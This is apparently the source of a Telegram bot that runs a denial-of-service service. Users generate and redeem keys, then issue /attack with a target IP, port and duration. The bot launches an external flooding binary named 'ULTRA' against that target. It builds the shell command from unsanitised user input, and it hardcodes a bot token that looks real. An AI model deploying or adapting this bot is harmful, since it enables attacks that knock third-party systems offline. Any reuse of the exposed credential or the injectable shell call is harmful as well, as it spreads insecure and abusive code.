import os
import asyncio
import random
import string
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7248127599:AAHwkME4J8unx-hS7dfiXTwgLfM2VsLfjAY'
ALLOWED_USER_ID = 6135948216
bot_access_free = True  

# Store pending attack requests, keys, and redeemed keys
pending_requests = {}
user_keys = {}
redeemed_keys = {}

# Key expiry time (in seconds)
KEY_EXPIRY_TIME = 300  # 5 minutes for standard keys
LONG_KEY_EXPIRY_TIME = 7200  # 120 minutes (2 hours) for the new long-term keys
REDEEMED_KEY_EXPIRY_TIME = 600  # 10 minutes for redeemed keys

def generate_key(expiry_time=KEY_EXPIRY_TIME):
    """Generate a random key with a custom expiry time."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)), expiry_time

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <key>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user has redeemed a valid key
    if chat_id not in redeemed_keys or redeemed_keys[chat_id]['expiry'] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="*❌ You don't have a valid redeemed key! Please redeem your key with /redeem <key>.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Launch the attack
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = args[0]

    # Check if the key is valid and not expired
    if chat_id not in user_keys or user_keys[chat_id]['key'] != key or user_keys[chat_id]['expiry'] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid or expired key! Please generate a new key using /genkey.*", parse_mode='Markdown')
        return

    # Redeem the key (mark it as redeemed and store the expiration time for the redeem period)
    redeemed_keys[chat_id] = {'key': key, 'expiry': time.time() + REDEEMED_KEY_EXPIRY_TIME}

    # Inform the user
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*🔑 Key Redeemed!*\nYour key is now active for performing actions like attacking.\n"
             f"*🕒 You can use this key for {REDEEMED_KEY_EXPIRY_TIME // 60} minutes.*",
        parse_mode='Markdown'
    )

async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    # Generate a standard key (valid for 5 minutes)
    if len(context.args) == 0 or context.args[0] == 'short':
        key, expiry_time = generate_key(KEY_EXPIRY_TIME)
    # Generate a long-term key (valid for 120 minutes)
    elif len(context.args) == 1 and context.args[0] == 'long':
        key, expiry_time = generate_key(LONG_KEY_EXPIRY_TIME)
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /genkey [short|long]*", parse_mode='Markdown')
        return

    # Store the generated key for the user
    user_keys[chat_id] = {'key': key, 'expiry': time.time() + expiry_time}

    # Send the generated key and expiry info to the user
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*🔑 Your key: {key}* \n"
             f"*🕒 This key will expire in {expiry_time // 60} minutes.*",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("genkey", genkey))

    application.run_polling()

if __name__ == '__main__':
    main()
